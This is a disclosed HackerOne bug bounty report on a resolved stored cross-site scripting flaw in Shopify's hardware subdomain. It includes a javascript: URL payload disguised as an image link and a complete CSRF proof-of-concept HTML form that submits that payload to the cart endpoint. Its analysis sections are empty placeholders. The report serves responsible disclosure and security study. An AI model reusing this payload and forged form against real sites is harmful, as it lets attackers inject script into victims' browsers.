---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '106636'
original_report_id: '106636'
title: Strored Cross Site Scripting
weakness: Cross-site Scripting (XSS) - Generic
team_handle: shopify
created_at: '2015-12-23T13:12:06.779Z'
disclosed_at: '2016-03-13T16:24:26.767Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 4
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# Strored Cross Site Scripting

## Metadata

- HackerOne Report ID: 106636
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: shopify
- Disclosed At: 2016-03-13T16:24:26.767Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hello ,
There is a stored cross site scripting at http://hardware.shopify.com .
I saw that you recently fixed a bug on this sub-domain , so I'm reporting this.


Video Proof of Concept : https://www.youtube.com/watch?v=cP66Bfb0IoE&feature=youtu.be

Payload used : `javascript:alert(document.domain) //http://google.com/uploads/pwned.jpg`

Here is a CSRF PoC also : 


	<html>
    <!-- CSRF PoC -->
    <body>
    <form action="http://hardware.shopify.com/cart/add" method="POST" enctype="multipart/form-data">
    <input type="hidden" name="properties&#91;Artwork&#32;file&#93;" value="javascript&#58;alert&#40;&quot;XSS&#32;by&#32;Hussein98d&quot;&#41;&#32;&#47;&#47;http&#58;&#47;&#47;google&#46;com&#47;uploads&#47;powned&#46;jpg" />
    <input type="hidden" name="properties&#91;Custom&#32;text&#32;line&#32;1&#93;" value="&#13;" />
    <input type="hidden" name="properties&#91;Custom&#32;text&#32;line&#32;2&#93;" value="&#13;" />
    <input type="hidden" name="properties&#91;Custom&#32;text&#32;line&#32;3&#93;" value="&#13;" />
    <input type="hidden" name="production&#45;time" value="standard" />
    <input type="hidden" name="id" value="976094353" />
    <input type="submit" value="Submit request" />
    </form>
	</body>
	</html>


Kind Regards
Hussein

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
